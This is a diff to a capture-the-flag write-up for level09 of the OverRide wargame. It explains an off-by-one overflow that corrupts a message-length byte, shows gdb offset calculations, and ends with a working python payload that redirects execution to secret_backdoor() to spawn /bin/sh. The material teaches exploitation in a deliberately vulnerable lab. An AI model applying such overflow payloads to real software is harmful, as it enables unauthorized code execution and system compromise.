@@ -9,7 +9,7 @@ The last 40 bytes of buf[] are reserved for the username in set_username().
 
 The issue is : we can overflow buf[] in set_username() :
 
-                |<= 40 == OFF BY ONE error !! we write 41 bytes instead of 40|
+                |<= 40 == OFF BY ONE error (41 bytes written instead of 40) !! we write at index buf[180], even though the last valid byte of the buffer is buf[179] (as 0 is an index!)|
 for (index = 0; index <= 40 && userbuf[index] != '\0'; index++)
 	buf_copy[140 + index] = userbuf[index];
 
@@ -26,6 +26,7 @@ So if we replace buf[180] by a bigger value than 140, we'll get a nice buffer ov
 The max value we can replace msg_len with is 255, because we can only overwrite one byte of msg_len (0xff is the max value)
 But that is enough to reach the return address of handle_msg() !
 
+Let's get the offset between the buf ($rbp-0xc0) and $rbp to reach the return address :
 (gdb) x/xw $rbp-0xc0
 0x7fffffffe4d0: 0x0000000a
 (gdb) x/xw $rbp     
@@ -33,7 +34,7 @@ But that is enough to reach the return address of handle_msg() !
 (gdb) p/d 0x7fffffffe590-0x7fffffffe4d0
 $1 = 192
 
-At buf + 192 there is rbp, so the return address is at buf + 200 (200-208).
+At buf + 192 there is rbp, so the return address is at buf + 200 BECAUSE it's at $rbp+0x8 as it's a 64 bit program (from 200 to 208).
 
 						   |\xd0 == 208|
 level09@OverRide:~$ python -c 'print "hack" * 10 + "\xd0\n" + "a" * 200 + "\xef\xbe\xad\xde"' | ./level09 
@@ -49,13 +50,13 @@ level09@OverRide:~$ dmesg | tail -n 1
 
 Now that we can redirect code execution, let's redirect it to something interesting.
 
-There is a function that launches system with whichever command we want : secret_backdoor()
+There is a function that launches system() with whichever command we want : secret_backdoor()
 So we get its address :
 (gdb) p secret_backdoor 
 $1 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>
 
 Now we can construct our final payload :
-[username overflow at buffer[180] --> 208 instead of 140] + [filling buf[180] and overwriting return address with address of secret_backdoor()] + [give "/bin/sh" as argument to system() in secret_backdoor() to get a shell]
+["hack" username to reach 40 bytes written] + [msglen overflow at buffer[180] --> 208 instead of 140] + [filling buf[180] and overwriting return address with address of secret_backdoor()] + [give "/bin/sh" as argument to system() in secret_backdoor() to get a shell]
 
 (python -c 'print "hack" * 10 + "\xd0" + "\n" + "a" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "\n" + "/bin/sh"'; cat) | ./level09
 
